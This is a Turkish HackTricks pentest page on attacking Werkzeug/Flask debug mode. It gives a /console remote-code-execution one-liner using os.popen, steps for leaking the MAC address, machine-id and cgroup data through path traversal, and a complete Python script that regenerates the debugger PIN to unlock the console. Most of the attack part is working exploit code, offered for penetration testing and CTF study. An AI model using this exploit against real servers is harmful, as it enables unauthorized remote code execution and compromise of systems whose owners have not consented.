# Werkzeug / Flask Hata Ayıklama

<details>

<summary><strong>AWS hacklemeyi sıfırdan kahramana öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Kırmızı Takım Uzmanı)</strong></a><strong> ile!</strong></summary>

HackTricks'i desteklemenin diğer yolları:

* **Şirketinizi HackTricks'te reklamını görmek istiyorsanız** veya **HackTricks'i PDF olarak indirmek istiyorsanız** [**ABONELİK PLANLARI'na**](https://github.com/sponsors/carlospolop) göz atın!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* **Katılın** 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) veya bizi **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)** takip edin.**
* **Hacking püf noktalarınızı paylaşarak PR göndererek HackTricks** ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına katkıda bulunun.

</details>

<figure><img src="../../.gitbook/assets/image (2) (1).png" alt=""><figcaption></figcaption></figure>

**Anında kullanılabilir zafiyet değerlendirme ve penetrasyon testi kurulumu**. 20'den fazla araç ve özellikle tam bir pentest çalıştırın, keşiften raporlamaya kadar uzanan. Pentester'ları değiştirmiyoruz - özel araçlar, tespit ve istismar modülleri geliştiriyoruz, böylece daha derine inme, kabukları patlatma ve eğlenme zamanı kazanıyorlar.

{% embed url="https://pentest-tools.com/" %}

## Konsol RCE

Hata ayıklama etkinse `/console`'a erişmeyi deneyebilir ve RCE elde edebilirsiniz.
```python
__import__('os').popen('whoami').read();
```
![](<../../.gitbook/assets/image (317).png>)

İnternette [bu](https://github.com/its-arun/Werkzeug-Debug-RCE) gibi birkaç açık bulunmaktadır veya metasploit'te bir tane.

## Pin Korumalı - Yol Geçişi

Bazı durumlarda **`/console`** ucu bir pin ile korunacaktır. Eğer bir **dosya geçişi açığı**nız varsa, o pin'i oluşturmak için gerekli tüm bilgileri sızdırabilirsiniz.

### Werkzeug Console PIN Sömürüsü

Uygulamada bir hata sayfası oluşturmak için bir hata zorlayın:
```
The console is locked and needs to be unlocked by entering the PIN.
You can find the PIN printed out on the standard output of your
shell that runs the server
```
Werkzeug'in hata ayıklama arayüzüne erişmeye çalışırken "konsol kilitli" senaryosuyla karşılaşılan bir mesaj, konsolu kilidini açmak için bir PIN gerektiğini belirtir. Werkzeug'in hata ayıklama başlatma dosyasındaki (`__init__.py`) PIN oluşturma algoritmasını analiz ederek konsol PIN'ini sömürme önerilir. PIN oluşturma mekanizması [**Werkzeug kaynak kod deposundan**](https://github.com/pallets/werkzeug/blob/master/src/werkzeug/debug/\_\_init\_\_.py) incelenebilir, ancak olası sürüm farklılıkları nedeniyle gerçek sunucu kodunu dosya gezintisi açığı aracılığıyla temin etmek tavsiye edilir.

Konsol PIN'ini sömürmek için `probably_public_bits` ve `private_bits` adlı iki değişken kümesine ihtiyaç vardır:

#### **`probably_public_bits`**

* **`username`**: Flask oturumunu başlatan kullanıcıyı ifade eder.
* **`modname`**: Genellikle `flask.app` olarak belirlenir.
* **`getattr(app, '__name__', getattr(app.__class__, '__name__'))`**: Genellikle **Flask**'a çözülür.
* **`getattr(mod, '__file__', None)`**: Flask dizinindeki (`/usr/local/lib/python3.5/dist-packages/flask/app.py` gibi) `app.py`'nin tam yolunu temsil eder. `app.py` uygun değilse, **`app.pyc`** deneyin.

#### **`private_bits`**

* **`uuid.getnode()`**: Geçerli makinenin MAC adresini alır, `str(uuid.getnode())` ile onu ondalık formata çevirir.
* **Sunucunun MAC adresini belirlemek** için uygulama tarafından kullanılan etkin ağ arabirimini (örneğin, `ens3`) tanımlamak gerekir. Belirsiz durumlarda, cihaz kimliğini bulmak için **`/proc/net/arp`'yi sızdırın**, ardından **MAC adresini** **`/sys/class/net/<cihaz kimliği>/address`**'den çıkarın.
*  Bir onaltılık MAC adresini ondalığa dönüştürme aşağıdaki gibi gerçekleştirilebilir:

```python
# Örnek MAC adresi: 56:00:02:7a:23:ac
>>> print(0x5600027a23ac)
94558041547692
```
* **`get_machine_id()`**: `/etc/machine-id` veya `/proc/sys/kernel/random/boot_id` ile `/proc/self/cgroup`'ın son eğik çizgiden sonraki ilk satırını birleştirir.

<details>

<summary>`get_machine_id()` için kod</summary>
```python
def get_machine_id() -> t.Optional[t.Union[str, bytes]]:
global _machine_id

if _machine_id is not None:
return _machine_id

def _generate() -> t.Optional[t.Union[str, bytes]]:
linux = b""

# machine-id is stable across boots, boot_id is not.
for filename in "/etc/machine-id", "/proc/sys/kernel/random/boot_id":
try:
with open(filename, "rb") as f:
value = f.readline().strip()
except OSError:
continue

if value:
linux += value
break

# Containers share the same machine id, add some cgroup
# information. This is used outside containers too but should be
# relatively stable across boots.
try:
with open("/proc/self/cgroup", "rb") as f:
linux += f.readline().strip().rpartition(b"/")[2]
except OSError:
pass

if linux:
return linux

# On OS X, use ioreg to get the computer's serial number.
try:
```
</detaylar>

Gerekli tüm veriler toplandıktan sonra, açıklayıcı betik çalıştırılarak Werkzeug konsol PIN'i oluşturulabilir. Betik, birleştirilmiş `probably_public_bits` ve `private_bits` kullanarak bir karmayı oluşturur, daha sonra bu karmayı işleyerek nihai PIN'i üretir. Aşağıda bu işlemi gerçekleştirmek için Python kodu bulunmaktadır:
```python
import hashlib
from itertools import chain
probably_public_bits = [
'web3_user',  # username
'flask.app',  # modname
'Flask',  # getattr(app, '__name__', getattr(app.__class__, '__name__'))
'/usr/local/lib/python3.5/dist-packages/flask/app.py'  # getattr(mod, '__file__', None),
]

private_bits = [
'279275995014060',  # str(uuid.getnode()),  /sys/class/net/ens33/address
'd4e6cb65d59544f3331ea0425dc555a1'  # get_machine_id(), /etc/machine-id
]

# h = hashlib.md5()  # Changed in https://werkzeug.palletsprojects.com/en/2.2.x/changes/#version-2-0-0
h = hashlib.sha1()
for bit in chain(probably_public_bits, private_bits):
if not bit:
continue
if isinstance(bit, str):
bit = bit.encode('utf-8')
h.update(bit)
h.update(b'cookiesalt')
# h.update(b'shittysalt')

cookie_name = '__wzd' + h.hexdigest()[:20]

num = None
if num is None:
h.update(b'pinsalt')
num = ('%09d' % int(h.hexdigest(), 16))[:9]

rv = None
if rv is None:
for group_size in 5, 4, 3:
if len(num) % group_size == 0:
rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
for x in range(0, len(num), group_size))
break
else:
rv = num

print(rv)
```
Bu betik, bitleri birleştirerek PIN'i oluşturur, belirli tuzlar ekler (`cookiesalt` ve `pinsalt`) ve çıktıyı biçimlendirir. Üretilen PIN'in Werkzeug konsolu tarafından beklenen PIN ile eşleşmesini sağlamak için `probably_public_bits` ve `private_bits` için gerçek değerlerin hedef sistemden doğru bir şekilde alınması önemlidir.

{% hint style="success" %}
Eğer **eski bir Werkzeug sürümünde** iseniz, **hashleme algoritmasını sha1 yerine md5'e** değiştirmeyi deneyin.
{% endhint %}

## Referanslar

* [**https://www.daehee.com/werkzeug-console-pin-exploit/**](https://www.daehee.com/werkzeug-console-pin-exploit/)
* [**https://ctftime.org/writeup/17955**](https://ctftime.org/writeup/17955)

<figure><img src="../../.gitbook/assets/image (2) (1).png" alt=""><figcaption></figcaption></figure>

**Anında kullanılabilir zafiyet değerlendirme ve penetrasyon testi kurulumu**. 20'den fazla araç ve özellikle tam bir pentest çalıştırın, keşiften raporlamaya kadar uzanan. Pentester'ları değiştirmiyoruz - özel araçlar, tespit ve istismar modülleri geliştiriyoruz, böylece daha derine inmek, kabuklar açmak ve eğlenmek için zaman kazanıyorlar.

{% embed url="https://pentest-tools.com/" %}

<details>

<summary><strong>Sıfırdan kahraman olmak için AWS hackleme öğrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks'i desteklemenin diğer yolları:

* **Şirketinizi HackTricks'te reklamını görmek istiyorsanız** veya **HackTricks'i PDF olarak indirmek istiyorsanız** [**ABONELİK PLANLARI**](https://github.com/sponsors/carlospolop)'na göz atın!
* [**Resmi PEASS & HackTricks ürünlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)'yi keşfedin, özel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* **💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katılın veya bizi Twitter'da** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)** takip edin.**
* **Hacking püf noktalarınızı paylaşarak HackTricks ve HackTricks Cloud** github depolarına PR göndererek.

</details>
